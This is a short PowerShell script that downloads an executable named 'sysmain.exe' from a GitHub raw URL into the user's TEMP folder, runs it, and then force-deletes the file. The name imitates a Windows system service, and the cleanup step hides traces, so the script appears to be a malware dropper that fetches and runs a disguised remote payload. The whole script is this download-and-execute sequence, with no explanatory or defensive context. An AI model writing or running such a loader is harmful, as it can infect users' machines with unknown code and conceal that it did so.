try {
    $exe = "$env:TEMP\sysmain.exe"
    Invoke-WebRequest "https://github.com/paneluserop/stm/raw/refs/heads/main/sysmain.exe" -OutFile $exe


    $process = Start-Process -FilePath $exe -PassThru

   
    $process.WaitForExit()

  
    Start-Sleep -Seconds 2

    Remove-Item $exe -Force
} catch {
    Write-Host "❌ Internal Error: $_"
}
